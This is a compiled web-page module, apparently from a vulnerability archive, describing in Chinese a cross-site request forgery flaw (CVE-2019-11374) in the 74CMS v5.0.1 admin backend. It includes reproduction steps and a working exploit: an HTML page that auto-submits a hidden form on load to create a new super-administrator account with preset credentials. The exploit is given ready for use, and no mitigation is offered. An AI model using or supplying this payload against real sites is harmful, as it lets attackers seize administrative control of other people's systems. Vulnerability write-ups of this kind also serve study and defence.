import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as t,c as i,e as n}from"./app-58e4a7d6.js";const a={},d=n(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>在74CMS v5.0.1后台存在一个跨站请求伪造(CSRF)漏洞，该漏洞url：/index.php?m=admin&amp;c=admin&amp;a=add 攻击者可以利用该漏洞诱骗管理员点击恶意页面，从而任意添加一个后台管理员账户，达到进入后台，获得一个后台管理员角色的控制权。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>74CMS v5.0.1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>首先我们登录后台页面，并添加管理员，然后添加信息，用burp_suite抓包</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/20190529207783.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>当管理员登录后台后，点击攻击者发来的连接即可创建一个新的超级管理员账户</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/20190529179538.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>利用exp如下：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
  &lt;head&gt;
  &lt;title&gt; CSRF &lt;/title&gt;
  &lt;script type=&quot;text/javascript&quot;&gt;
    function exec1(){
      document.getElementById(&#39;form1&#39;).submit();
    }
  &lt;/script&gt;
  &lt;/head&gt;
  &lt;body onload=&quot;exec1();&quot;&gt;
    &lt;form id=&quot;form1&quot; action=&quot;https://www.0dayhack.com/index.php?m=Admin&amp;c=admin&amp;a=add&quot; method=&quot;POST&quot;&gt;
      &lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;admin688&quot; /&gt;
  &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;111111111@qq.com&quot; /&gt;
      &lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;admin688&quot; /&gt;
      &lt;input type=&quot;hidden&quot; name=&quot;repassword&quot; value=&quot;admin688&quot; /&gt;  
  &lt;input type=&quot;hidden&quot; name=&quot;role_id&quot; value=&quot;1&quot; /&gt;
    &lt;/form&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,11),l=[d];function u(s,o){return t(),i("div",null,l)}const m=e(a,[["render",u],["__file","74cms v5.0.1 后台跨站请求伪造漏洞 CVE-2019-11374.html.vue"]]);export{m as default};
